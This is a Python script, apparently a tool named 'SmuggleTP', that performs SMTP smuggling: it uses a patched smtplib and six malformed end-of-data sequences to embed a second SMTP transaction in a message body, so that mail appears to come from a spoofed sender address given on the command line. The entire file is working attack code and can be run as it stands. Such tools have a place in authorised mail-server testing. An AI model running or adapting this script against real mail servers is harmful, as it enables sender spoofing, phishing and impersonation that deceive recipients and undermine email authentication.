#!/usr/bin/env python3

import smtplibhack as smtplib
import logging
import argparse

# Payloads
payloads = [('n.n', '\n.\n'), ('rn.n', '\r\n.\n'), ('n.rn', '\n.\r\n'), ('r.r', '\r.\r'), ('rn0.n', '\r\n\x00.\n'), ('n0.rn', '\n\x00.\r\n')]

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

# Parse command line arguments
parser = argparse.ArgumentParser()
parser.add_argument('--smtp_server', required=True, help='SMTP server hostname')
parser.add_argument('--smtp_port', default='25', type=int, required=True, help='SMTP server port')
parser.add_argument('--smtp_username', help='SMTP username')
parser.add_argument('--smtp_password', help='SMTP password')
parser.add_argument('--sender_email', required=True, help='Sender email address')
parser.add_argument('--receiver_email', required=True, help='Receiver email address')
parser.add_argument('--spoofed_email', required=True, help='Spoofed email address')
parser.add_argument('--enable_debug', action='store_true', help='Enable SMTP debug messages')
args = parser.parse_args()

# SMTP server details
smtp_server = args.smtp_server
smtp_port = args.smtp_port
smtp_username = args.smtp_username
smtp_password = args.smtp_password

# Email details
sender_email = args.sender_email
receiver_email = args.receiver_email
spoofed_email = args.spoofed_email

logging.info(f'Connecting to SMTP server {smtp_server}:{smtp_port} ...')
server = smtplib.SMTP(smtp_server, smtp_port, local_hostname='SmuggleTP') # Create a SMTP session
if args.enable_debug:
    server.set_debuglevel(1)  # Enable debug messages
server.starttls()  # Enable TLS encryption
if smtp_username and smtp_password:
    logging.info(f'Performing authentication using {smtp_username} user ...')
    server.login(smtp_username, smtp_password)  # Perform authentication

for payload in payloads:
    message = f'Subject: Test\r\nFrom: {sender_email}\r\nTo: {receiver_email}\r\n\r\nTest' + payload[1] + f'mail FROM:<{spoofed_email}>\r\nrcpt TO:<{receiver_email}>\r\ndata\r\nSubject: SmuggleTP (Payload ' + payload[0] + f')\r\nFrom: {spoofed_email}\r\nTo: {receiver_email}\r\n\r\nSmuggleTP (Payload ' + payload[0] + f')'
    logging.info(f'Sending SMTP Smuggling (Payload ' + payload[0] + f') email from {sender_email} (Spoofing {spoofed_email}) to {receiver_email} ...')
    server.sendmail(sender_email, receiver_email, message.encode('utf-8'))  # Send the email
    logging.info(f'Email from {sender_email} (Spoofing {spoofed_email}) to {receiver_email} sent successfully.')

server.quit()  # End the SMTP session
logging.info(f'Connection closed to {smtp_server}:{smtp_port} SMTP server.')
